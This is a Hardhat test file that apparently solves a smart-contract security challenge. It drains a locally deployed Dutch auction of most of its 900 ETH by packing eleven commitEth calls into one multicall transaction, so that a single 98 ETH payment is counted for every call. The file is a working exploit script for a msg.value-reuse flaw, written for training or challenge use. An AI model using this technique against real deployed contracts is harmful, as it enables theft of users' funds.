import { expect } from "chai";
import { Contract, Signer, BigNumber } from "ethers";
import { ethers } from "hardhat";

const BN = BigNumber;
let precision = BN.from(10).pow(18);

let accounts: Signer[];
let attacker: Signer;
let o1: Signer;
let o2: Signer;
let admin: Signer; // should not be used
let adminUser: Signer; // should not be used
let treasureVault: Contract;
let farm: Contract;
let dutchAuction: Contract;
let attackerStart;

/// preliminary state
before(async () => {

  accounts = await ethers.getSigners();
  [attacker, o1, o2, admin, adminUser] = accounts;

  // initializing core + periphery auction contracts
  let farmFactory = await ethers.getContractFactory('Token')
  farm = await farmFactory.connect(admin).deploy('FARM','FARM')
  await farm.connect(admin).mintPerUser(
    [await admin.getAddress()],[precision.mul(1_000_000)]
  )

  let dutchAuctionFactory = await ethers.getContractFactory('DutchAuction')
  dutchAuction = await dutchAuctionFactory.connect(admin).deploy()

  await farm.connect(admin).approve(dutchAuction.address,precision.mul(1_000_000))

  await dutchAuction.connect(admin).initAuction(
    await admin.getAddress(),
    farm.address,
    precision.mul(1_000_000),
    (await ethers.provider.getBlock('latest')).timestamp+1,
    (await ethers.provider.getBlock('latest')).timestamp+101,
    precision.mul(1).div(1_000), // start_price: 0.001 ETH per FARM token
    precision.mul(1).div(2_000), // min_price: 0.0005 ETH per FARM token
    await admin.getAddress()
  )

  // --buying into the auction w/ 900 ETH
  await dutchAuction.connect(adminUser).commitEth(await adminUser.getAddress(),{value:precision.mul(900)})

  // getting starting attacker balance
  attackerStart = await ethers.provider.getBalance(await attacker.getAddress())

});

it("solves the challenge", async function () {

  await ethers.provider.send('evm_mine') // not necessary

  let iface = new ethers.utils.Interface([
    "function multicall(bytes[] data) payable",
    "function commitEth(address _beneficiary) payable"
  ])

  let singleFunctionCall = iface.encodeFunctionData("commitEth", [
    await attacker.getAddress()
  ])

  let chainedCalls = []
  for (let i=0; i<11; i++) {
    chainedCalls.push(singleFunctionCall)
  }

  let attackFunctionCall = iface.encodeFunctionData("multicall", [
    chainedCalls
  ])

  await attacker.sendTransaction({to:dutchAuction.address, data:attackFunctionCall, value:precision.mul(98)})

});

/// expected final state
after(async () => {

  // attacker drains >= 90% ETH from contract
  expect(await ethers.provider.getBalance(dutchAuction.address)).to.be.lte(precision.mul(90))
  expect((await ethers.provider.getBalance(await attacker.getAddress())).sub(attackerStart)).to.be.gte(precision.mul(810))

});